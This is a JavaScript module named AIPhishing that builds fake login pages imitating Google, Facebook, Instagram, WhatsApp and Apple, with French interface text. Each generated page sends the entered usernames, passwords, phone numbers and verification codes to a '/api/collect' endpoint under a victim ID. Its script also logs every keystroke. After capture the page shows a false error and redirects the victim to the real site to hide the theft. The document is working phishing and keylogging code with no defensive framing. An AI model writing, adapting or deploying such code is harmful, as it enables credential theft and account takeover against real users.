class AIPhishing {
    
    static templates = {
        google: {
            domains: ['accounts.google.com', 'gmail.com', 'drive.google.com'],
            fields: ['email', 'password'],
            logo: 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png'
        },
        facebook: {
            domains: ['facebook.com', 'messenger.com'],
            fields: ['email', 'pass'],
            logo: 'https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg'
        },
        instagram: {
            domains: ['instagram.com'],
            fields: ['username', 'password'],
            logo: 'https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png'
        },
        whatsapp: {
            domains: ['web.whatsapp.com'],
            fields: ['phone', 'code'],
            logo: 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DSxOAUB0raA.png'
        },
        apple: {
            domains: ['appleid.apple.com', 'icloud.com'],
            fields: ['accountName', 'password'],
            logo: 'https://www.apple.com/ac/globalnav/7/en_US/images/globalnav/apple/image_large.svg'
        }
    };
    
    static async generate(victim, targetSite) {
        const template = this.templates[targetSite] || this.templates.google;
        
        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>${targetSite} - Connexion</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                        background: #f0f2f5;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .login-box {
                        background: white;
                        padding: 40px;
                        border-radius: 8px;
                        box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
                        width: 100%;
                        max-width: 400px;
                    }
                    .logo {
                        text-align: center;
                        margin-bottom: 30px;
                    }
                    .logo img {
                        max-height: 50px;
                    }
                    .field {
                        margin-bottom: 15px;
                    }
                    .field input {
                        width: 100%;
                        padding: 14px 16px;
                        border: 1px solid #dddfe2;
                        border-radius: 6px;
                        font-size: 17px;
                        box-sizing: border-box;
                    }
                    .field input:focus {
                        outline: none;
                        border-color: #1877f2;
                        box-shadow: 0 0 0 2px #e7f3ff;
                    }
                    button {
                        width: 100%;
                        padding: 14px;
                        background: #1877f2;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        font-size: 20px;
                        font-weight: 600;
                        cursor: pointer;
                        margin-top: 10px;
                    }
                    button:hover {
                        background: #166fe5;
                    }
                    .footer {
                        text-align: center;
                        margin-top: 20px;
                        color: #606770;
                        font-size: 14px;
                    }
                    .error {
                        color: #c00;
                        font-size: 13px;
                        margin-top: 5px;
                        display: none;
                    }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <div class="logo">
                        <img src="${template.logo}" alt="${targetSite}">
                    </div>
                    
                    <form id="loginForm" onsubmit="return false;">
                        ${template.fields.map(field => `
                            <div class="field">
                                <input type="${field.includes('password') ? 'password' : 'text'}" 
                                       name="${field}" 
                                       placeholder="${field === 'email' ? 'Adresse email' : 
                                                     field === 'pass' ? 'Mot de passe' :
                                                     field === 'phone' ? 'Numéro de téléphone' :
                                                     field === 'code' ? 'Code de vérification' :
                                                     field.charAt(0).toUpperCase() + field.slice(1)}"
                                       required>
                            </div>
                        `).join('')}
                        
                        <button type="submit" onclick="submitForm()">Se connecter</button>
                    </form>
                    
                    <div class="footer">
                        <a href="#">Mot de passe oublié ?</a> · <a href="#">S'inscrire</a>
                    </div>
                    
                    <div class="error" id="errorMsg">Identifiants incorrects</div>
                </div>
                
                <script>
                    function submitForm() {
                        const data = {};
                        ${template.fields.map(field => `
                            data.${field} = document.querySelector('input[name="${field}"]').value;
                        `).join('')}
                        
                        fetch('/api/collect', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victimId: '${victim.id}',
                                type: 'credentials',
                                data: {
                                    site: '${targetSite}',
                                    ...data,
                                    timestamp: Date.now(),
                                    url: window.location.href
                                }
                            })
                        }).then(() => {
                            document.getElementById('errorMsg').style.display = 'block';
                            setTimeout(() => {
                                window.location.href = 'https://www.${targetSite}.com';
                            }, 2000);
                        });
                        
                        return false;
                    }
                    
                    // Capturer les frappes
                    document.querySelectorAll('input').forEach(input => {
                        input.addEventListener('keydown', function(e) {
                            fetch('/api/collect', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    victimId: '${victim.id}',
                                    type: 'keylog',
                                    data: {
                                        key: e.key,
                                        field: this.name,
                                        time: Date.now()
                                    }
                                })
                            });
                        });
                    });
                </script>
            </body>
            </html>
        `;
        
        return html;
    }
}

module.exports = AIPhishing;
